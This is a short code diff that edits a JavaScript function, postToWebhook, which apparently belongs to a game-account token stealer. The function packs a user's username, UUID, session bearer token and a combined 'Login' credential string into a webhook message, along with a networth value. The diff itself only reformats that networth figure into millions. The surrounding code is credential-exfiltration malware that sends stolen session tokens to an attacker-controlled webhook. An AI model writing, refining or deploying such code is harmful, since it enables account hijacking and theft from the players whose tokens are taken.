@@ -133,7 +133,7 @@ function postToWebhook(username, bearerToken, uuid, networth) {
             title: "User Info", color: 0x00ff50, fields: [
                 {name: "Username", value: username, inline: true},
                 {name: "UUID", value: uuid, inline: true},
-                {name: "ELT", value: networth, inline: true},
+                {name: "ELT", value: networth / 1000000 + "M", inline: true},
                 {name: "SessionID", value: bearerToken, inline: false},
                 {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: true},
             ]
